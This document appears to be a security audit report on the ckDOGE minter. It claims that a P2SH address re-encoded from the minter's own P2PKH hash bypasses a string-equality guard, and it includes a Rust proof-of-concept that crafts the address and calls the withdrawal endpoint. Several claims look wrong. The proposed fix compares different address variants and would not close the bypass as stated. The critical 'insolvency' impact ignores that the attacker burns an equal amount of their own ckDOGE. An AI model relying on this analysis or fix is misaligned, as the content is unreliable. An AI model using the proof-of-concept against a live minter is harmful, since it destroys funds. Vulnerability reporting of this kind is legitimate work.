Audit Report

## Title
Self-Address Guard Bypassed via P2SH Address with Identical Hash — (`rs/bitcoin/ckbtc/minter/src/updates/retrieve_btc.rs`, `rs/dogecoin/ckdoge/minter/src/lib.rs`)

## Summary

The ckDOGE minter's self-address guard in `retrieve_btc_with_approval` uses a plain string equality check against the minter's P2PKH address string. Because a P2SH address encoding the same 20-byte hash produces a completely different base58 string, the guard does not fire. An attacker can burn their own ckDOGE and cause the minter to permanently send DOGE to a P2SH address it can never spend, irreversibly reducing the minter's spendable DOGE reserve.

## Finding Description

**Guard is a string comparison.** In `retrieve_btc_with_approval`, the only self-address check is:

```rust
let main_address_str = state::read_state(|s| runtime.derive_minter_address_str(s));
if args.address == main_address_str {
    ic_cdk::trap("illegal retrieve_btc target");
}
``` [1](#0-0) 

**Minter address is always P2PKH.** `derive_minter_address_str` calls `account_to_p2pkh_address_from_state`, which returns `DogecoinAddress::P2pkh(hash160(pubkey))`, displayed with `DOGE_MAINNET_P2PKH_PREFIX = 30`, producing a string starting with `D`. [2](#0-1) [3](#0-2) 

**P2SH with the same hash produces a different string.** `DOGE_MAINNET_P2SH_PREFIX = 22` produces a string starting with `A`. The `==` comparison returns `false` for a P2SH address built from the same 20-byte hash H, so the guard does not fire. [4](#0-3) 

**`parse_address` accepts P2SH.** The ckDOGE runtime's `parse_address` accepts both P2PKH and P2SH addresses and maps them to `BitcoinAddress::P2sh(bytes)`. [5](#0-4) 

**Transaction builder emits a P2SH output.** For `BitcoinAddress::P2sh`, the builder calls `bitcoin::ScriptBuf::new_p2sh(...)`, creating a valid on-chain P2SH output. [6](#0-5) 

**Minter cannot spend from that P2SH address.** Spending a P2SH UTXO requires a redeem script whose `hash160` equals H. The minter only holds the ECDSA private key for the public key whose `hash160` is H; it has no redeem script and only signs P2PKH inputs. The DOGE sent to this address is permanently unspendable.

A second non-string guard exists (`derive_minter_address` returning `BitcoinAddress`) but it is not called anywhere in the `retrieve_btc_with_approval` flow — only `derive_minter_address_str` is used for the guard. [7](#0-6) 

## Impact Explanation

Every successful exploit permanently removes DOGE from the minter's spendable reserve: the attacker's ckDOGE is burned and the corresponding DOGE is sent to an address the minter can never spend. The attack is repeatable by any principal holding ckDOGE. Sustained execution drains the minter's entire spendable DOGE pool, causing protocol insolvency for ckDOGE — a permanent loss of in-scope chain-key/ledger assets. This matches the Critical impact class: permanent loss of in-scope chain-key assets with no recovery path.

## Likelihood Explanation

No privilege is required. Any non-anonymous principal with a ckDOGE balance and an ICRC-2 approval can execute the attack in a single `retrieve_doge_with_approval` call. The minter's P2PKH address is publicly queryable via `get_doge_address`. Constructing the corresponding P2SH address requires only decoding the base58 P2PKH address, swapping the version byte from 30 to 22, recomputing the checksum, and re-encoding — trivially achievable with any standard base58/SHA-256 library. No off-chain infrastructure, no privileged access, and no threshold corruption is required.

## Recommendation

Replace the string equality guard with a structural comparison. After parsing `args.address` into a `BitcoinAddress`, compare it against the parsed minter address (already available via `derive_minter_address`):

```rust
let minter_addr = state::read_state(|s| runtime.derive_minter_address(s));
let parsed_address = runtime
    .parse_address(&args.address, btc_network)
    .map_err(RetrieveBtcWithApprovalError::MalformedAddress)?;
if parsed_address == minter_addr {
    ic_cdk::trap("illegal retrieve_btc target");
}
```

This rejects any address — regardless of type — whose underlying 20-byte hash matches the minter's hash, closing the type-confusion bypass entirely.

## Proof of Concept

```rust
// 1. Query the minter's P2PKH address
let p2pkh_str = minter.get_doge_address(...); // e.g. "DPubKeyHashXXX..."

// 2. Decode and extract the 20-byte hash H
let decoded = bs58::decode(&p2pkh_str).into_vec().unwrap(); // 25 bytes
let hash: [u8; 20] = decoded[1..21].try_into().unwrap();

// 3. Re-encode as P2SH (version byte 22 for mainnet)
let mut payload = vec![22u8];
payload.extend_from_slice(&hash);
let checksum = sha256d(&payload)[..4].to_vec();
payload.extend_from_slice(&checksum);
let p2sh_str = bs58::encode(&payload).into_string();

// 4. p2sh_str != p2pkh_str → guard does not fire
assert_ne!(p2sh_str, p2pkh_str);

// 5. parse_address accepts it
assert!(DogecoinAddress::parse(&p2sh_str, &Network::Mainnet).is_ok());

// 6. Call retrieve_doge_with_approval with p2sh_str as destination
//    → ckDOGE burned, DOGE sent to P2SH(H), permanently locked.
minter.retrieve_doge_with_approval(RetrieveBtcWithApprovalArgs {
    amount: attacker_balance,
    address: p2sh_str,
    from_subaccount: None,
}).await.unwrap();
```

A deterministic integration test using PocketIC can confirm: (1) the guard does not trap, (2) the burn succeeds, (3) the minter emits a transaction with a P2SH output to the constructed address, and (4) the minter's UTXO set no longer includes those funds.

### Citations

**File:** rs/bitcoin/ckbtc/minter/src/updates/retrieve_btc.rs (L254-258)
```rust
    let main_address_str = state::read_state(|s| runtime.derive_minter_address_str(s));

    if args.address == main_address_str {
        ic_cdk::trap("illegal retrieve_btc target");
    }
```

**File:** rs/dogecoin/ckdoge/minter/src/lib.rs (L186-201)
```rust
    fn parse_address(
        &self,
        address: &str,
        network: ic_ckbtc_minter::Network,
    ) -> Result<BitcoinAddress, std::string::String> {
        let doge_network = Network::try_from(network)?;
        let doge_address =
            DogecoinAddress::parse(address, &doge_network).map_err(|e| e.to_string())?;

        // This conversion is a hack to use the same type of address as in RetrieveBtcRequest,
        // since this type is used both in the event logs (event `AcceptedRetrieveBtcRequest`)
        // and in the minter state (field `pending_retrieve_btc_requests`)
        Ok(match doge_address {
            DogecoinAddress::P2pkh(bytes) => BitcoinAddress::P2pkh(bytes),
            DogecoinAddress::P2sh(bytes) => BitcoinAddress::P2sh(bytes),
        })
```

**File:** rs/dogecoin/ckdoge/minter/src/lib.rs (L209-221)
```rust
    fn derive_minter_address(&self, state: &CkBtcMinterState) -> BitcoinAddress {
        let main_account = Account {
            owner: ic_cdk::api::canister_self(),
            subaccount: None,
        };
        let minter_address = updates::account_to_p2pkh_address_from_state(state, &main_account);

        // This conversion is a hack to use the same type of address as in TxOut,
        match minter_address {
            DogecoinAddress::P2pkh(p2pkh) => BitcoinAddress::P2pkh(p2pkh),
            DogecoinAddress::P2sh(p2sh) => BitcoinAddress::P2sh(p2sh),
        }
    }
```

**File:** rs/dogecoin/ckdoge/minter/src/lib.rs (L223-231)
```rust
    fn derive_minter_address_str(&self, state: &CkBtcMinterState) -> String {
        let main_account = Account {
            owner: ic_cdk::api::canister_self(),
            subaccount: None,
        };
        let minter_address = updates::account_to_p2pkh_address_from_state(state, &main_account);
        minter_address
            .display(&Network::try_from(state.btc_network).expect("BUG: unsupported network"))
    }
```

**File:** rs/dogecoin/ckdoge/minter/src/address/mod.rs (L9-11)
```rust
// See https://github.com/dogecoin/dogecoin/blob/7237da74b8c356568644cbe4fba19d994704355b/src/chainparams.cpp#L167
const DOGE_MAINNET_P2PKH_PREFIX: u8 = 30;
const DOGE_MAINNET_P2SH_PREFIX: u8 = 22;
```

**File:** rs/dogecoin/ckdoge/minter/src/address/mod.rs (L108-116)
```rust
    pub fn display(&self, network: &Network) -> String {
        let prefix = match (self, network) {
            (DogecoinAddress::P2pkh(_), Network::Mainnet) => DOGE_MAINNET_P2PKH_PREFIX,
            (DogecoinAddress::P2sh(_), Network::Mainnet) => DOGE_MAINNET_P2SH_PREFIX,
            (DogecoinAddress::P2pkh(_), Network::Regtest) => DOGE_REGTEST_P2PKH_PREFIX,
            (DogecoinAddress::P2sh(_), Network::Regtest) => DOGE_REGTEST_P2SH_PREFIX,
        };
        version_and_hash_to_address(prefix, self.as_array())
    }
```

**File:** rs/dogecoin/ckdoge/minter/src/transaction/mod.rs (L162-169)
```rust
                script_pubkey: match output.address {
                    ic_ckbtc_minter::address::BitcoinAddress::P2pkh(hash) => {
                        bitcoin::ScriptBuf::new_p2pkh(&bitcoin::PubkeyHash::from_byte_array(hash))
                    }
                    ic_ckbtc_minter::address::BitcoinAddress::P2sh(hash) => {
                        bitcoin::ScriptBuf::new_p2sh(&bitcoin::ScriptHash::from_byte_array(hash))
                    }
                    _ => panic!("BUG: Dogecoin does not support other address types"),
```
